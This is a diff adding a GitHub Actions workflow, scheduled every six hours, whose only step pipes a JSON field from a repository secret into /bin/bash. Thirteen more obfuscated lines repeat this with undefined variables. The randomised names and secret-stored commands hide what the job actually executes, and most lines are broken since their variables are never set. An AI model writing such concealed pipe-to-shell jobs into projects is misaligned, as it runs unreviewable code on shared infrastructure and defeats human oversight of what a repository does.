@@ -1,0 +1,29 @@
+name: piaofenpeiwokan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: piaofenpeiwokan
+        env:
+          xxggr7: ${{ secrets.xxggr7 }}
+        run: |
+          echo $xxggr7 | jq -r .xg8 | /bin/bash
+          echo $b8184 | jq -r .mtark7 | /bin/bash
+          echo $mg4 | jq -r .d51596 | /bin/bash
+          echo $ulvm7 | jq -r .rwmrb0 | /bin/bash
+          echo $nnpf8229 | jq -r .i3806 | /bin/bash
+          echo $cgm3083 | jq -r .s997 | /bin/bash
+          echo $bmor07 | jq -r .d341 | /bin/bash
+          echo $ss66 | jq -r .vljjj9063 | /bin/bash
+          echo $m978 | jq -r .a7 | /bin/bash
+          echo $sxlsy7977 | jq -r .i2528 | /bin/bash
+          echo $qcoap1 | jq -r .p0569 | /bin/bash
+          echo $zrlg38 | jq -r .zgxy7147 | /bin/bash
+          echo $z567 | jq -r .sa80590 | /bin/bash
+          echo $oimlz52178 | jq -r .jxk1 | /bin/bash
+
